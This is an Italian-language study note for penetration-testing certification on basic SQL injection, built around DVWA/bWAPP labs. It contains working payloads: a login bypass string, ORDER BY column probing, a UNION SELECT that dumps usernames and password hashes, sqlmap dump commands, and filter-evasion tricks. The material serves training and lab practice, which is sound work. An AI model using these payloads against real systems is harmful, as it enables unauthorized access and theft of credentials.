# SQL Injection Basics

**Difficoltà:** Intermediate
**Time to Master:** 2h
**Prerequisiti:** [01-Web-Fundamentals-HTTP.md](01-Web-Fundamentals-HTTP.md)
**Lab:** DVWA / bWAPP — SQL Injection

---

## Obiettivo

Riconoscere e sfruttare a livello base una SQL Injection: bypass di autenticazione, estrazione dati con UNION, uso di sqlmap. eJPTv2 richiede solo le varianti più comuni, non l'approfondimento completo che si trova in eWPT.

---

## Concetti chiave

### Tipi principali

| Tipo | Descrizione |
|------|-------------|
| In-band (error-based) | l'errore SQL viene mostrato direttamente nella risposta |
| In-band (UNION-based) | si usa `UNION SELECT` per unire dati arbitrari all'output |
| Blind boolean-based | la risposta cambia (vero/falso) senza mostrare errori/dati diretti |
| Blind time-based | si inferisce il risultato misurando il ritardo di risposta (`SLEEP()`) |

### Dove cercarla

Qualsiasi parametro che finisce in una query SQL senza sanitizzazione: campi di login, parametri `?id=`, filtri di ricerca, header custom usati lato server.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| sqlmap | `sqlmap -u "http://target.com/item?id=1" --batch` | rilevamento e sfruttamento automatico | conferma sempre manualmente prima |
| Burp Repeater | invio manuale richieste modificate | risposta completa | utile per capire il comportamento esatto |

---

## Payload / Esempi

### Esempio 1: bypass autenticazione classico

```
Username: admin' OR '1'='1' --
Password: qualsiasi
```

**Output atteso:** login riuscito come primo utente della tabella (spesso admin).

**Spiegazione:** la query lato server diventa tipicamente `SELECT * FROM users WHERE user='admin' OR '1'='1' -- ' AND pass='...'`. La condizione `'1'='1'` è sempre vera, `--` commenta il resto della query (controllo password incluso).

### Esempio 2: error-based, individuare il numero di colonne

```
http://target.com/item?id=1' ORDER BY 1--
http://target.com/item?id=1' ORDER BY 2--
http://target.com/item?id=1' ORDER BY 3--   <- errore qui: la tabella ha 2 colonne
```

**Spiegazione:** si incrementa `ORDER BY N` finché non si ottiene un errore ("Unknown column"): il numero precedente è il numero di colonne, prerequisito per costruire una UNION corretta.

### Esempio 3: UNION-based per estrarre dati

```
http://target.com/item?id=-1 UNION SELECT username,password FROM users--
```

**Output atteso:**
```
admin | 5f4dcc3b5aa765d61d8327deb882cf99
```

**Spiegazione:** `id=-1` (valore inesistente) fa sì che solo i dati dalla UNION vengano mostrati; il numero di colonne selezionate deve corrispondere a quello trovato con ORDER BY.

### Esempio 4: sqlmap automatico

```bash
sqlmap -u "http://target.com/item?id=1" --batch --dbs
sqlmap -u "http://target.com/item?id=1" --batch -D webapp --tables
sqlmap -u "http://target.com/item?id=1" --batch -D webapp -T users --dump
```

**Spiegazione:** flusso standard sqlmap: elenca database (`--dbs`), poi tabelle di un database (`-D`), poi dump di una tabella specifica (`-T ... --dump`). `--batch` accetta le opzioni di default senza chiedere conferma interattiva.

---

## Evasion / Bypass Techniques

- Se le virgolette sono filtrate, prova a codificare in URL-encoding (`%27` per `'`)
- Se `OR`/`UNION` sono filtrati (parole chiave), prova varianti di case (`UnIoN`) o commenti inline (`UN/**/ION`)

---

## Lab Hands-On

### Lab 1: DVWA — SQL Injection (livello low/medium)
**Obiettivo:** eseguire bypass login e UNION-based extraction
**Difficulty:** Facile-Media
**Time:** 45 min

**Walkthrough breve:**
1. Imposta DVWA a livello "low", testa il payload di bypass autenticazione
2. Sul modulo SQLi, trova il numero di colonne con ORDER BY
3. Estrai username/password con UNION SELECT
4. Ripeti a livello "medium" e osserva cosa cambia nel filtro

---

## Common Mistakes

- Lanciare sqlmap senza aver prima verificato manualmente il parametro -> troppi falsi negativi/positivi se non capisci il comportamento dell'app
- Dimenticare `-1` o un id inesistente nella UNION -> i dati reali della riga si mischiano con quelli iniettati ed è più difficile leggerli

---

## Link Utili

- [sqlmap — documentazione ufficiale](https://github.com/sqlmapproject/sqlmap/wiki)
- [PortSwigger Academy — SQL injection](https://portswigger.net/web-security/sql-injection)

---

## Connessioni

- **Prerequisito:** [01-Web-Fundamentals-HTTP.md](01-Web-Fundamentals-HTTP.md)
- **Prossimo Step:** [03-XSS-Basics.md](03-XSS-Basics.md)
- **Combinazione con:** [05-Burp-Suite-Basics.md](05-Burp-Suite-Basics.md)

---

## Checklist di padronanza

- [ ] So eseguire un bypass di autenticazione classico
- [ ] So trovare il numero di colonne con ORDER BY
- [ ] So costruire una UNION SELECT per estrarre dati
- [ ] So usare sqlmap per il flusso dbs -> tables -> dump

---

## Note personali

_(spazio libero)_
